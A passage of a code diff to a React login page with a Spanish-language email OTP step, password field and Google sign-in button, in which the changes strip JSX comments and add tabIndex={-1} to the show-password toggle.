             </div>
 
@@ -743,7 +696,6 @@ const Login = () => {
                 Hemos enviado un codigo de 6 digitos a <strong className="text-foreground/80">{email}</strong>
               </p>
 
-              {/* OTP Inputs */}
               <div className="flex justify-center gap-2">
                 {otpCode.map((digit, index) => (
                   <input
@@ -815,7 +767,6 @@ const Login = () => {
       <VideoBackground />
 
       <div className="relative z-10 w-full max-w-sm animate-fade-in-up">
-        {/* Avatar + Title */}
         <div className="flex flex-col items-center mb-6">
           <div className="relative mb-3">
             <div className="w-24 h-24 rounded-full overflow-hidden border-2 border-border shadow-[0_0_40px_rgba(255,255,255,0.06)] bg-black">
@@ -839,7 +790,6 @@ const Login = () => {
           <p className="text-[10px] text-muted-foreground/70 tracking-widest uppercase">Secure Gateway v2.4</p>
         </div>
 
-        {/* Status bar */}
         <div className="flex items-center justify-center gap-4 mb-5">
           {[
             { icon: Shield, label: "AES-256" },
@@ -853,7 +803,6 @@ const Login = () => {
           ))}
         </div>
 
-        {/* Login Card */}
         <div className="glass-card p-5 glow-border">
           <div className="flex items-center gap-2 mb-5 pb-3 border-b border-border/30">
             <div className="w-8 h-8 rounded-lg bg-secondary/60 border border-border/40 flex items-center justify-center">
@@ -901,6 +850,7 @@ const Login = () => {
                   type="button"
                   onClick={() => setShowPass(!showPass)}
                   className="absolute right-3 top-1/2 -translate-y-1/2 text-muted-foreground/60 hover:text-foreground transition-colors"
+                  tabIndex={-1}
                 >
                   {showPass ? <EyeOff className="w-4 h-4" /> : <Eye className="w-4 h-4" />}
                 </button>
@@ -931,7 +881,6 @@ const Login = () => {
               ) : "Siguiente"}
             </button>
 
-            {/* Google Sign-In Button */}
             <div className="relative my-3">
               <div className="absolute inset-0 flex items-center">
                 <span className="w-full border-t border-border/30" />
@@ -962,7 +911,6 @@ const Login = () => {
           </form>
         </div>
 
-        {/* Footer */}
         <div className="mt-6 text-center">
           <p className="text-[9px] text-muted-foreground/40 leading-relaxed">
             Secure Proxy Configuration System — Encrypted Connection
